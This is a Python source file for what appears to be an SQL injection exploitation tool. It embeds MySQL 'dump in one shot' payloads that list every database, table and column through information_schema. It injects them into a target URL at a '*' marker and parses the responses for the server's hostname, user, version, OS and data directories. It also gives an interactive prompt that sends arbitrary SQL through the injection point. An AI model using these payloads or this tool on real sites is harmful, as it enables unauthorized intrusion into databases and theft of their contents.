import re
import requests
from .Dios import Dios

class Sqli:

    def __init__(self, url):
      self.url= url
      self.dios = " (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x) "
      self.show_dbs = "(SELECT+(@x)+FROM+(SELECT+(@x:=0x00),(@NR_DB:=0),(SELECT+(0)+FROM+(INFORMATION_SCHEMA.SCHEMATA)+WHERE+(@x)+IN+(@x:=CONCAT(@x,LPAD(@NR_DB:=@NR_DB%2b1,2,0x30),0x20203a2020,schema_name, 0x3c62723e))))x)"

    def information(self, level=1):
        dios = Dios().get_information()
        response = requests.get(self.url.replace('*',dios))

        if level == 1:
            sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",response.text)
            if ( sqli_helper ):
                sqli_helper = sqli_helper.group(1)

                hostname        = re.search("<hostname\(\)>(.*)</hostname\(\)>", sqli_helper)
                port            = re.search("<port\(\)>(.*)</port\(\)>", sqli_helper)
                user            = re.search("<user\(\)>(.*)</user\(\)>", sqli_helper)
                schema          = re.search("<schema\(\)>(.*)</schema\(\)>", sqli_helper)
                version         = re.search("<version>(.*)</version>", sqli_helper)
                os_version      = re.search("<os_version>(.*)</os_version>", sqli_helper)
                mechine_version = re.search("<mechine_version>(.*)</mechine_version>", sqli_helper)
                base_dir        = re.search("<base_dir>(.*)</base_dir>", sqli_helper)
                data_dir        = re.search("<data_dir>(.*)</data_dir>", sqli_helper)
                ssl             = re.search("<ssl>(.*)</ssl>", sqli_helper)
                openssl         = re.search("<openssl>(.*)</openssl>", sqli_helper)
                symlink         = re.search("<symlink>(.*)</symlink>", sqli_helper)
                socket          = re.search("<socket>(.*)</socket>", sqli_helper)

                hostname        = hostname.group(1)         if bool(hostname)           else "can't get information"
                port            = port.group(1)             if bool(port)               else "can't get information"
                user            = user.group(1)             if bool(user)               else "can't get information"
                schema          = schema.group(1)           if bool(schema)             else "can't get information"
                version         = version.group(1)          if bool(version)            else "can't get information"
                os_version      = os_version.group(1)       if bool(os_version)         else "can't get information"
                mechine_version = mechine_version.group(1)  if bool(mechine_version)    else "can't get information"
                base_dir        = base_dir.group(1)         if bool(base_dir)           else "can't get information"
                data_dir        = data_dir.group(1)         if bool(data_dir)           else "can't get information"
                ssl             = ssl.group(1)              if bool(ssl)                else "can't get information"
                openssl         = openssl.group(1)          if bool(openssl)            else "can't get information"
                symlink         = symlink.group(1)          if bool(symlink)            else "can't get information"
                socket          = socket.group(1)           if bool(socket)             else "can't get information"

                
            else:
                return {
                    "status": False,
                    "message": "Response sql injectin do not match"
                }

        return {
                    "hostname": hostname,
                    "port": port,
                    "user": user,
                    "schema": schema,
                    "version": version,
                    "os_version": os_version,
                    "mechine_version": mechine_version,
                    "base_dir": base_dir,
                    "data_dir": data_dir,
                    "ssl": ssl,
                    "openssl": openssl,
                    "symlink": symlink,
                    "socket": socket 
        }
    
    def command_line(self):
        user = Dios().build(Dios().user())
        try:
            response = requests.get(self.url.replace('*',user))
            sqli_helper = re.search("<sqli-helper>(.*)</sqli-helper>",response.text).group(1)
            user        = re.search("<user\(\)>(.*)</user\(\)>", sqli_helper)
            user        = user.group(1)
            cmd         = input("\033[96m┌["+ user +"]\n\033[96m└\033[93m#\033[97m ")
            if cmd == "dump_data":
                r           = requests.get(self.url.replace('*', Dios().build(self.dios)))
                output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
                if re.search("<br>", output):
                    br = output.split("<br>")
                    for result in br:
                        print(result)
                    self.command_line()
            elif cmd == "show dbs":
                r           = requests.get(self.url.replace('*', Dios().build(self.show_dbs)))
                output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
                print("Database : ")
                print(output.replace("<br>", "\n"))
                self.command_line()
            else:
                r           = requests.get(self.url.replace('*', Dios().build(cmd)))
                output      = re.search("<sqli-helper>(.*)</sqli-helper>",r.text).group(1)
                print(f"\n[+] Output : {output}\n")
            self.command_line()
        except Exception:
            print("\n[!] Syntax Error!\n")
            self.command_line()